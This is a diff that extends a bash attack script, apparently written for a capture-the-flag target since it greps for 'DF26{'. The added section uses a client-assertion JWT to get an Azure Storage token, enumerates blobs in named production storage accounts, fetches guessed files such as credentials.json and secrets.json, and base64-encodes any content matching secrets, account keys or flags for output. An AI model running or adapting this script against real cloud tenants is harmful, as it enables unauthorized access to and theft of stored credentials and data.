@@ -56,4 +56,27 @@ for name in $(echo "$LIST" | jq -r '.value[]?.id | split("/") | last'); do
     fi
   done
 done
+
+say STORAGE_PHASE
+STOR_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token"   -d "client_id=$CID" -d 'grant_type=client_credentials'   -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer'   -d "client_assertion=$J" -d 'scope=https://storage.azure.com/.default')
+STOK=$(echo "$STOR_R" | jq -r '.access_token // empty')
+if [[ -z "$STOK" ]]; then say "STORAGE_TOKEN_FAIL"; else say STORAGE_TOKEN_OK; fi
+for pair in 'sttblappcfgprodx3euoz:config' 'sttblbackupprodx3euoz:exports' 'sttblcilogsprodx3euoz:logs' 'sttblarchiveprodx3euoz:'; do
+  acc=${pair%%:*}; cont=${pair##*:}; [[ -n "$cont" ]] || continue
+  base="https://$acc.blob.core.windows.net/$cont"
+  LB=$(curl -sS --max-time 20 -H "Authorization: Bearer $STOK" -H 'x-ms-version: 2021-08-06' "$base?restype=container&comp=list")
+  names=$(echo "$LB" | jq -r '.EnumerationResults.Blobs.Blob[]?.Name' 2>/dev/null || true)
+  say "LIST_${acc}_${cont}_B64=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
+  for bn in $names internal-config.json config.json flag flag.txt export.json credentials.json secrets.json; do
+    [[ -n "$bn" ]] || continue
+    url="$base/$bn"
+    code=$(curl -sS --max-time 20 -o /tmp/blob.bin -w '%{http_code}' -H "Authorization: Bearer $STOK" -H 'x-ms-version: 2021-08-06' "$url" || echo 000)
+    [[ "$code" == "200" ]] || continue
+    txt=$(head -c 20000 /tmp/blob.bin | tr -d '\000')
+    if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
+      say "BLOB_${acc}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
+    fi
+  done
+done
+say STORAGE_END
 say END
